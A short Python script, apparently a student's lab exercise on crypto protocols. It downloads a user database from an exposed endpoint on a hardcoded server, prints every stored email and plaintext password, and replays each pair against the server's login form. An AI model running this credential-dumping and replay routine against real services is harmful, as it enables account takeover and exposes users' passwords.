import sqlite3 as sql
import requests
import json
import os
import datetime


def timeNow():
    today = datetime.datetime.today()
    date = today.strftime("%H.%M.%S")
    return date


def getData(url):
    f = open(dataBaseName, "wb")

    req = requests.get(url)
    # print(req.content)
    f.write(req.content)
    f.close()


def getTitleBlock(text):
    start = str(text).split('<h1 class="title">')# + len(tag)
    wel = start[1].split('</h1>')[0]
    return wel


def authentication(data):
    print(data,111111111111111)
    req = requests.post(url + "login",data=data)
    text = req.text
    # print(text)
    # res = getTitleBlock(text)
    # return res


def getReq(id:int,email:str,psswrd:str,name:str) -> dict:
    req = {
        "id": id,
        "email": email,
        "password": psswrd,
        "name": name
    }
    return req


if __name__ == '__main__':
    dataBaseName = "data_base.db-" + timeNow() + ".sqlite3"
    tmp = input("Number:1,2,3 or 4 ")
    if tmp == "0":
        tmp = '0/'
    elif tmp == "1":
        tmp = '1/'
    elif tmp == "2":
        tmp = "2/"
    else:
        tmp = "3/"
    url = "http://94.103.95.24:500" + tmp
    getData(url + "db")
    connection = sql.connect(dataBaseName)
    data = connection.execute("SELECT * FROM user")
    # print(connection.cursor().fetchall())
    # print(f"Count of accaunt: {connection.cursor().fetchall()}")
    for user in data:
        req = getReq(user[0],user[1],user[2],user[3])
        print(f"{req.get('id')}, {req.get('email')}, "
              f"{req.get('password')}, {req.get('name')}")
        res = authentication(req)
        print(f"Result on place Name in db: {res}")
    getTime = timeNow()
    print(os.listdir("/mnt/c/Users/Jfisto/Desktop/DSTU/CryptoProtocol"))
    try:
        os.remove(dataBaseName)
        print(f"Delete db {getTime}")
    except PermissionError:
        print("PermissionError")
